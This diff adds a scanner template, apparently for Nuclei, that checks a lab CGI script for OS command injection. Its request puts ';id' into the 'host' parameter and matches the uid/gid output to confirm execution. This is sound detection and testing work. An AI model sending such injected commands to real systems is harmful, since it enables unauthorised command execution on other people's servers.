@@ -1,0 +1,33 @@
+id: lab-command-injection-ping
+
+info:
+  name: ARGUS Lab - OS Command Injection in ping.sh
+  author: argus-lab
+  severity: critical
+  description: |
+    The lab diagnostic endpoint /cgi-bin/ping.sh passes the "host" parameter to
+    eval, allowing arbitrary command execution as the web user.
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+  classification:
+    cwe-id: CWE-78
+  tags: lab,cmdi,rce,cgi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/ping.sh?host=127.0.0.1;id"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+\\([^)]*\\)\\s+gid=[0-9]+"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+\\([^)]*\\)\\s+gid=[0-9]+\\([^)]*\\)"
